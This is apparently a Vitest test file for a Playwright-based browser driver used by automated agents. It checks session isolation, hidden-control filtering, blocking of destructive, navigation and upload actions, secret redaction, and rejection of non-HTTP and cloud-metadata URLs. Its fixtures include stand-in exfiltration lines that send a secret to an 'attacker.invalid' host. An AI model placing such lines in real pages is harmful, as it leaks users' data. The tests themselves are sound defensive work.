import { chromium } from "@playwright/test";
import { mkdtemp, rm, stat, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeAll, describe, expect, it } from "vitest";
import { createServer } from "node:http";
import { createPlaywrightDriver } from "../src/index.mjs";

let browserAvailable = false;
const cleanup = [];

beforeAll(async () => {
  try {
    const browser = await chromium.launch();
    await browser.close();
    browserAvailable = true;
  } catch {
    browserAvailable = false;
  }
});

afterEach(async () => {
  await Promise.all(cleanup.splice(0).map((item) => item()));
});

describe("playwright behavioral driver", () => {
  it("isolates BrowserContexts per session and writes traces", async () => {
    if (!browserAvailable) return;
    const app = await serve(`<button id="set" onclick="localStorage.setItem('seen','yes')">Set</button><button id="read" onclick="document.body.dataset.seen=localStorage.getItem('seen')||'no'">Read</button>`);
    const driver = createPlaywrightDriver({ browserType: chromium });
    const dir = await tempDir();
    const first = await driver.start(input("s1", app.url, path.join(dir, "s1"), { allowClick: true, allowStateMutation: true }));
    const second = await driver.start(input("s2", app.url, path.join(dir, "s2"), { allowClick: true, allowStateMutation: true }));

    const firstObservation = await driver.observe(first);
    await driver.execute(first, { type: "click", elementId: firstObservation.semantic.interactiveElements.find((item) => item.name === "Set").id, reasonCode: "set_storage" });
    const secondObservation = await driver.observe(second);
    await driver.execute(second, { type: "click", elementId: secondObservation.semantic.interactiveElements.find((item) => item.name === "Read").id, reasonCode: "read_storage" });

    await driver.close(first);
    await driver.close(second);
    expect(await stat(path.join(dir, "s1", "trace.zip"))).toMatchObject({ size: expect.any(Number) });
    expect(await stat(path.join(dir, "s2", "trace.zip"))).toMatchObject({ size: expect.any(Number) });
    await app.close();
    cleanup.push(() => rm(dir, { recursive: true, force: true }));
  });

  it("does not expose hidden or occluded controls and blocks forged hidden clicks", async () => {
    if (!browserAvailable) return;
    const app = await serve(`<button style="display:none">Hidden Pay</button><button id="covered" style="position:absolute;left:20px;top:20px">Covered</button><div style="position:absolute;left:0;top:0;width:200px;height:100px;background:white">Overlay</div><button style="position:absolute;left:20px;top:140px">Safe</button>`);
    const driver = createPlaywrightDriver({ browserType: chromium });
    const dir = await tempDir();
    const handle = await driver.start(input("hidden", app.url, dir, { allowClick: true, allowStateMutation: true }));
    const observation = await driver.observe(handle);
    expect(observation.semantic.interactiveElements.map((item) => item.name)).toEqual(["Safe"]);
    expect(observation.semantic.interactiveElements[0]).not.toHaveProperty("selector");
    const safeClick = await driver.execute(handle, { type: "click", elementId: observation.semantic.interactiveElements[0].id, reasonCode: "safe_visible_click" });
    expect(safeClick).toMatchObject({ status: "success" });
    await driver.observe(handle);
    const result = await driver.execute(handle, { type: "click", elementId: "el_999", reasonCode: "forged" });
    expect(result).toMatchObject({ status: "blocked", message: "Element was not in the latest perceived observation" });
    await driver.close(handle);
    await app.close();
    cleanup.push(() => rm(dir, { recursive: true, force: true }));
  });

  it("blocks destructive clicks and cross-origin redirects", async () => {
    if (!browserAvailable) return;
    const app = await serve(`<button onclick="location.href='https://attacker.invalid/collect?secret=abc'">Continue</button><button>Delete account</button>`);
    const driver = createPlaywrightDriver({ browserType: chromium });
    const dir = await tempDir();
    const handle = await driver.start(input("safety", app.url, dir, { allowClick: true, allowStateMutation: true, stopBeforeConfirmation: true }));
    const observation = await driver.observe(handle);
    const del = await driver.execute(handle, { type: "click", elementId: observation.semantic.interactiveElements.find((item) => item.name === "Delete account").id, reasonCode: "confirm_delete" });
    expect(del).toMatchObject({ status: "blocked", message: "Destructive confirmation/payment action blocked" });
    const freshObservation = await driver.observe(handle);
    const redirect = await driver.execute(handle, { type: "click", elementId: freshObservation.semantic.interactiveElements.find((item) => item.name === "Continue").id, reasonCode: "primary_action" });
    expect(redirect).toMatchObject({ status: "blocked" });
    expect(redirect.message).not.toContain("abc");
    await driver.close(handle);
    await app.close();
    cleanup.push(() => rm(dir, { recursive: true, force: true }));
  });

  it("collects semantic screenshot evidence plus console, HTTP, and request failure issues", async () => {
    if (!browserAvailable) return;
    const app = await serve(`<script>console.error('broken widget'); fetch('/missing'); fetch('https://attacker.invalid/collect').catch(()=>{});</script><h1>Hello</h1><button>Start</button>`);
    const driver = createPlaywrightDriver({ browserType: chromium });
    const dir = await tempDir();
    const handle = await driver.start(input("evidence", app.url, dir, { allowClick: true }));
    const observation = await driver.observe(handle);
    expect(observation.visual.screenshotEvidenceId).toContain("screenshot");
    expect(observation.semantic.headings[0]).toMatchObject({ text: "Hello" });
    expect(observation.runtime.consoleIssues.some((item) => item.message.includes("broken widget"))).toBe(true);
    expect(observation.runtime.networkFailures.some((item) => ["HTTP_STATUS", "REQUEST_FAILED", "ORIGIN_BLOCKED"].includes(item.severity))).toBe(true);
    await driver.close(handle);
    await app.close();
    cleanup.push(() => rm(dir, { recursive: true, force: true }));
  });

  it("enforces navigation, mutation, upload, and external-origin policy", async () => {
    if (!browserAvailable) return;
    const external = await serve(`<h1>External</h1>`);
    const app = await serve(`<a href="${external.url}">External</a><form action="/submitted"><button>Submit form</button></form><button onclick="fetch('/mutate',{method:'POST'})">Mutate</button><button onclick="fetch('/upload',{method:'POST',body:new FormData()})">Upload</button>`);
    const driver = createPlaywrightDriver({ browserType: chromium });
    const dir = await tempDir();
    const environment = { baseUrl: app.url, allowedOrigins: [app.url, external.url], viewport: { width: 390, height: 844 } };

    const navigation = await driver.start({ ...input("navigation", app.url, path.join(dir, "navigation"), { allowClick: true, allowNavigation: false }), environment });
    let observation = await driver.observe(navigation);
    expect(await driver.execute(navigation, { type: "click", elementId: elementId(observation, "External"), reasonCode: "follow_link" })).toMatchObject({ status: "blocked", message: "Navigation is blocked by policy" });
    observation = await driver.observe(navigation);
    expect(await driver.execute(navigation, { type: "back", reasonCode: "go_back" })).toMatchObject({ status: "blocked", message: "Navigation is blocked by policy" });

    const externalBlocked = await driver.start({ ...input("external", app.url, path.join(dir, "external"), { allowClick: true, allowNavigation: true, allowExternalOrigin: false }), environment });
    observation = await driver.observe(externalBlocked);
    expect(await driver.execute(externalBlocked, { type: "click", elementId: elementId(observation, "External"), reasonCode: "follow_link" })).toMatchObject({ status: "blocked", message: "External-origin navigation is blocked by policy" });

    const mutation = await driver.start({ ...input("mutation", app.url, path.join(dir, "mutation"), { allowClick: true, allowNavigation: true, allowStateMutation: false }), environment });
    observation = await driver.observe(mutation);
    expect(await driver.execute(mutation, { type: "click", elementId: elementId(observation, "Submit form"), reasonCode: "submit" })).toMatchObject({ status: "blocked", message: "Form submission is blocked by policy" });
    observation = await driver.observe(mutation);
    expect(await driver.execute(mutation, { type: "click", elementId: elementId(observation, "Mutate"), reasonCode: "mutate" })).toMatchObject({ status: "blocked", message: "Scriptable control requires allowStateMutation" });

    const upload = await driver.start({ ...input("upload", app.url, path.join(dir, "upload"), { allowClick: true, allowNavigation: true, allowStateMutation: true, allowFileUpload: false }), environment });
    observation = await driver.observe(upload);
    expect(await driver.execute(upload, { type: "click", elementId: elementId(observation, "Upload"), reasonCode: "upload" })).toMatchObject({ status: "blocked", message: "File upload is blocked by policy" });

    await driver.closeAll();
    await app.close();
    await external.close();
    cleanup.push(() => rm(dir, { recursive: true, force: true }));
  });

  it("records blocked background requests without poisoning later actions", async () => {
    if (!browserAvailable) return;
    const app = await serve(`<script>fetch('/background',{method:'POST'}).catch(()=>{})</script><h1>Ready</h1>`);
    const driver = createPlaywrightDriver({ browserType: chromium });
    const dir = await tempDir();
    const handle = await driver.start(input("background", app.url, dir, { allowStateMutation: false }));
    const observation = await driver.observe(handle);

    expect(observation.runtime.networkFailures).toContainEqual(expect.objectContaining({ severity: "ACTION_NOT_ALLOWED", method: "POST" }));
    expect(await driver.execute(handle, { type: "wait", durationMs: 0, reasonCode: "settle" })).toMatchObject({ status: "success" });
    await driver.observe(handle);
    expect(await driver.execute(handle, { type: "wait", durationMs: 0, reasonCode: "settle_again" })).toMatchObject({ status: "success" });

    await driver.close(handle);
    await app.close();
    cleanup.push(() => rm(dir, { recursive: true, force: true }));
  });

  it("revalidates retained elements and excludes values and off-viewport semantics", async () => {
    if (!browserAvailable) return;
    const app = await serve(`<title>super-secret</title><h1>Visible heading</h1><p>Token: super-secret</p><input aria-label="API key" value="super-secret"><input type="checkbox" aria-label="Remember" checked><button id="swap">Continue</button><h2 style="position:absolute;top:2000px">Offscreen secret</h2><script>console.error('super-secret');setTimeout(()=>swap.replaceWith(Object.assign(document.createElement('button'),{textContent:'Continue'})),150)</script>`);
    const driver = createPlaywrightDriver({ browserType: chromium });
    const dir = await tempDir();
    const handle = await driver.start({
      ...input("toctou", `${app.url}?token=super-secret`, dir, { allowClick: true, allowStateMutation: true }),
      valueRefs: { token: "super-secret" },
      evidencePolicy: { screenshot: "every_action", trace: true, video: "all", semanticSnapshot: "every_action" },
    });
    const observation = await driver.observe(handle);
    expect(JSON.stringify(observation.semantic)).not.toContain("super-secret");
    expect(observation.page.title).not.toContain("super-secret");
    expect(observation.evidence.every((entry) => entry.type !== "screenshot")).toBe(true);
    expect(JSON.stringify(observation.semantic)).not.toContain("Offscreen secret");
    expect(observation.page.url).not.toContain("super-secret");
    expect(JSON.stringify(observation.runtime)).not.toContain("super-secret");
    expect(observation.semantic.headings[0]).toMatchObject({ text: "Visible heading", viewportPosition: { inViewport: true } });
    expect(observation.semantic.interactiveElements.find((item) => item.name === "Remember")).toMatchObject({ checked: true });
    await new Promise((resolve) => setTimeout(resolve, 200));
    expect(await driver.execute(handle, { type: "click", elementId: elementId(observation, "Continue"), reasonCode: "continue" })).toMatchObject({ status: "blocked", message: "Observed element changed before action" });
    expect((await driver.close(handle)).evidence.every((entry) => !["trace", "video"].includes(entry.type))).toBe(true);
    await app.close();
    cleanup.push(() => rm(dir, { recursive: true, force: true }));
  });

  it("redacts mixed-case and fully percent-encoded fixture secrets reflected in URL paths", async () => {
    if (!browserAvailable) return;
    const secret = "A/B";
    const mixedCaseEncodedSecret = "A%2fB";
    const fullyEncodedSecret = "%41%2F%42";
    const app = await serve(`<h1>Reflected path</h1>`);
    const driver = createPlaywrightDriver({ browserType: chromium });
    const dir = await tempDir();
    const handle = await driver.start({
      ...input("path-secret", app.url, dir, {}),
      environment: {
        baseUrl: app.url,
        allowedOrigins: [app.url],
        startPath: `/reflected/${mixedCaseEncodedSecret}/${fullyEncodedSecret}`,
        viewport: { width: 390, height: 844 },
      },
      valueRefs: { token: secret },
    });

    const observation = await driver.observe(handle);
    const action = await driver.execute(handle, { type: "wait", durationMs: 0, reasonCode: "inspect" });
    const recorded = JSON.stringify({ observation, action });
    expect(recorded).not.toContain(secret);
    expect(recorded.toLowerCase()).not.toContain(mixedCaseEncodedSecret.toLowerCase());
    expect(recorded.toLowerCase()).not.toContain(fullyEncodedSecret.toLowerCase());
    expect(recorded).toContain("[REDACTED]");

    await driver.close(handle);
    const malformedHandle = await driver.start({
      ...input("malformed-path-secret", app.url, path.join(dir, "malformed"), {}),
      environment: {
        baseUrl: app.url,
        allowedOrigins: [app.url],
        startPath: `/malformed/%E0%A4%A/${encodeURIComponent(secret)}`,
        viewport: { width: 390, height: 844 },
      },
      valueRefs: { token: secret },
    });
    const malformedRecorded = JSON.stringify(await driver.observe(malformedHandle));
    expect(malformedRecorded.toLowerCase()).not.toContain(encodeURIComponent(secret).toLowerCase());
    expect(malformedRecorded).toContain("[REDACTED]");

    await driver.close(malformedHandle);
    await app.close();
    cleanup.push(() => rm(dir, { recursive: true, force: true }));
  });

  it("honors disabled screenshot and trace evidence while retaining successful network metadata", async () => {
    if (!browserAvailable) return;
    const app = await serve(`<h1>Hello</h1>`);
    const driver = createPlaywrightDriver({ browserType: chromium });
    const dir = await tempDir();
    const handle = await driver.start({ ...input("policy", app.url, dir, {}), evidencePolicy: { screenshot: "off", trace: false, video: "off" } });
    const observation = await driver.observe(handle);
    expect(observation.visual).not.toHaveProperty("screenshotEvidenceId");
    expect(observation.evidence.every((item) => item.type !== "screenshot")).toBe(true);
    expect(observation.runtime.networkFailures).toContainEqual(expect.objectContaining({ severity: "HTTP_RESPONSE", method: "GET", status: 200 }));
    expect(await driver.close(handle)).toEqual({ evidence: [] });
    await app.close();
    cleanup.push(() => rm(dir, { recursive: true, force: true }));
  });

  it("rejects non-HTTP URLs and storage state outside the workspace", async () => {
    const driver = createPlaywrightDriver({ browserType: chromium });
    const dir = await tempDir();
    await writeFile(path.join(dir, "state.json"), "{}");
    await expect(driver.start(input("scheme", "file:///tmp/page.html", path.join(dir, "scheme"), {}))).rejects.toThrow("environment.baseUrl must be a valid HTTP(S) URL");
    await expect(driver.start(input("metadata", "http://169.254.169.254/latest/meta-data", path.join(dir, "metadata"), {}))).rejects.toThrow("blocked metadata host");
    await expect(driver.start({ ...input("storage", "http://127.0.0.1/", path.join(dir, "storage"), {}), environment: { baseUrl: "http://127.0.0.1/", storageStatePath: path.join(dir, "state.json") } })).rejects.toThrow("storageStatePath must resolve within the workspace");
    cleanup.push(() => rm(dir, { recursive: true, force: true }));
  });
});

function elementId(observation, name) {
  return observation.semantic.interactiveElements.find((item) => item.name === name).id;
}

function input(sessionId, baseUrl, evidenceDir, safetyPolicy) {
  return {
    sessionId,
    evidenceDir,
    environment: { baseUrl, allowedOrigins: [baseUrl], viewport: { width: 390, height: 844 } },
    stabilization: { domQuietMs: 25, maxWaitMs: 500 },
    safetyPolicy,
  };
}

async function tempDir() {
  return mkdtemp(path.join(tmpdir(), "playwright-driver-"));
}

async function serve(html) {
  const server = createServer((request, response) => {
    if (request.url === "/missing") {
      response.writeHead(500, { "content-type": "text/plain" });
      response.end("missing");
      return;
    }
    response.writeHead(200, { "content-type": "text/html" });
    response.end(html);
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const { port } = server.address();
  return { url: `http://127.0.0.1:${port}/`, close: () => new Promise((resolve) => server.close(resolve)) };
}
